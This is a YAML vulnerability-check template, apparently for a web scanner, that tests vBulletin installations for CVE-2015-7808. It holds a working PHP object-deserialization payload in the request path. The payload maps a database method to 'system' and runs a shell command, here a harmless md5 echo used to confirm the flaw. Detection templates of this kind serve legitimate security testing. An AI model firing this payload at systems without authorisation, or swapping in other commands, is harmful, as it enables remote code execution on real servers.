name: poc-yaml-vbulletin-cve-2015-7808
manual: true
transport: http
set:
    s1: randomLowercase(32)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A17%3A%22vB_Database_MySQL%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A52%3A%22php+-r+%22echo+md5%28{{s1}}%29%3B%22%22%3B%7D
        expression: (response.status == 200 || response.status == 500) && response.body.bcontains(bytes(md5(s1)))
expression: r0()
detail:
    author: scholar
    links:
        - https://www.hacking8.com/bug-web/vBulletin/CVE-2015-7808-VBulletin-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
    vulnerability:
        id: CT-21053
        level: high
